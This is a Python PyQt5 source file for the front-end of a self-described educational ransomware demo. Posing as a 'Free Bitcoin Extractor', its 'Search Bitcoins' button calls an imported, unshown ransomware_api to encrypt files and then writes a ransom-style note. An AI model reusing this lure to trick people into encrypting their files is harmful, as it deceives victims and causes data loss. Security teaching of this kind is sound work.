#!/usr/bin/env python

#from win32api import GetSystemMetrics
from functools import partial


import os
import sys
import re
from PyQt5.QtWidgets import QApplication, QWidget, QPushButton, QLineEdit, QProgressBar
from PyQt5.QtGui import QIcon
from PyQt5.QtCore import pyqtSlot

import ransomware_api as rs_api
 
class App(QWidget):
 
	def __init__(self):
		super().__init__()
		self.title = 'Free Bitcoin Extractor!'
		self.left = 500
		self.top = 500
		self.width = 600
		self.height = 400
		self.initUI()

	def initUI(self):
		self.setWindowTitle(self.title)
		self.setGeometry(self.left, self.top, self.width, self.height)
		
		self.emailLine = self.setEmailLine()
		self.emailLine.textChanged.connect(self.changeEnableButtonStatus)

		self.decryptButton = self.setButton('Send Bitcoins', self.decrypt, [150, 70], [320, 170])


		self.encryptButton = self.setButton('Search Bitcoins', self.encrypt, [150, 70], [120, 170])
		self.encryptButton.setEnabled(False)

		self.progressBar = self.setProgressBar()


		self.show()


	def setProgressBar(self):
		self.progressBar = QProgressBar(self)
		self.progressBar.move(120, 290)
		self.progressBar.resize(350, 30)
		self.progressBar.setMinimum(0)
		self.progressBar.setMaximum(100)
		self.progressBar.setValue(0)

		return self.progressBar

	

	#Enables or disables the encryption button based on the email
	def changeEnableButtonStatus(self):
		if isValidEmail(self.emailLine.text()):
			self.encryptButton.setEnabled(True)
		else:
			self.encryptButton.setEnabled(False)
	
	def setEmailLine(self):
		self.emailLine = QLineEdit(self)
		self.emailLine.setPlaceholderText("Enter email where program will send bitcoin!")
		self.emailLine.move(120, 80)
		self.emailLine.resize(340, 50)
		return self.emailLine

	def encrypt(self):
		#encryption script called here and final button made true at the end
		#this will also update the loading bar

		rs_api.encrypt(self.emailLine.text())
		self.progressBar.setValue(100)
		#enable decryption after encryption is complete

		self.decryptButton.setText("Decrypt Files")
		self.encryptButton.setText("Encrypt Files")
		self.title = 'You got ransomwared son!'
		write_text_file()

	def decrypt(self):
		#decryption script called here- will also update the loading bar
		rs_api.decrypt(self.emailLine.text())

		print("decrypt")

	def setButton(self, title, method, size, position):
		button = QPushButton(title, self)
		button.clicked.connect(method)
		button.resize(size[0], size[1])
		button.move(position[0], position[1])
		return button


def write_text_file():
	f = open("instructions.txt", "w")
	f.write("Your files have been encrypted!!!")
	f.write("Normally, an attacker at this point would request crypto currency payment and give instructions on how to do that.")
	f.write("Since this is just a demo for educational purposes, we will forego that part and allow you to simply decrypt your files by pressing on the decrypt button.")
	f.write("Stay safe out there!")
	f.close()


def isValidEmail(email):
	return bool(re.match("^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$", email)) and len(email) > 7

if __name__ == '__main__':
	app = QApplication([])
	ex = App()
	ex.show()
	sys.exit(app.exec_())
